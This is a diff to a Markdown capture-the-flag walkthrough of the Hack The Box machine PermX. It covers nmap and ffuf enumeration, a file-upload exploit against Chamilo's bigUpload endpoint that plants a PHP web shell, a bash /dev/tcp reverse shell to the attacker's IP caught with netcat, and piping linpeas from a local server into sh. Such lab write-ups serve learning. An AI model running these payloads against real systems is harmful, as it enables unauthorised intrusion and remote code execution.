@@ -9,6 +9,10 @@ This is the first machine I pwned without any spoilers (from write-ups)
 ## Nmap
 
 Nmap results:
+```sh
+$ nmap -sC -sV -vv "10.10.11.23" -oA PermX 
+```
+
 ```
 # Nmap 7.94SVN scan initiated Mon Jul  8 02:28:19 2024 as: nmap -sC -sV -vv -oA PermX 10.10.11.23
 Nmap scan report for 10.10.11.23
@@ -34,7 +38,7 @@ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Adding new host `permx.htb` to our `/etc/hosts` file
 
-```shell
+```sh
 $ sudo echo "10.10.11.23 permx.htb" >> /etc/hosts
 ```
 
@@ -47,9 +51,10 @@ After navigating the pages, which gave us nothing to work with. This leaves us w
 > I should make it a habit to document all the results
 
 Directory fuzzing:
-```
+```sh
 $ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://permx.htb/FUZZ
-
+```
+```
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
@@ -84,8 +89,10 @@ Seems like they're all resources related to the index website, not much to work 
 
 
 Sub-domain fuzzing:
-```
+```sh
 $ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fl 10
+```
+```
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -145,7 +152,7 @@ With the proof of concept mentioned in the advisory, we can craft our payload.
 
 ## Web-shell
 
-```shell
+```sh
 $ echo '<?php system($_GET["cmd"]); ?>' > rce.php
 $ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
@@ -162,7 +169,7 @@ Open up `vim` or `nano` and paste your payload, because `echo` does not like thi
 
 ```sh
 $ cat shell.php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/1234 0>&1'");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/1234 0>&1'");?>
 $ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
 
@@ -176,8 +183,41 @@ $ nc -lvnp 1234
 ```
 And visit the php file we just uploaded
 
-```
-curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php
+```shell
+$ curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php
 ```
 
 This will pop a shell on the terminal that's running netcat
+
+```
+listening on [any] 1234 ...
+connect to [<local-ip>] from (UNKNOWN) [10.10.11.23] 41228
+bash: cannot set terminal process group (1169): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$   
+```
+
+Then you can run `linpeas` on it
+
+> I guess a web shell could work too, but a reverse shell is easier to manage.
+
+# Privilege Escalation
+
+## Linpeas
+
+Obtaining `linpeas` from your local box by running `python3 -m http.server 5050` locally.
+
+Running `linpeas` on the remote box.
+```sh
+www-data@permx:/tmp/tmp.12345$ curl http://<local-ip>:5050/linpeas.sh | sh > linpeas.result
+```
+
+How to read `linpeas` output file with color
+```
+less -r linpeas.result
+```
+
+After some digging
+
+- Since we were `www-data`, a low-level user, most of the application or `root` exploit wasn't likely to be done without normal `user` privilege.
+- I did't believe I can somehow pop a `root` shell on the web-facing application under `/var/www`
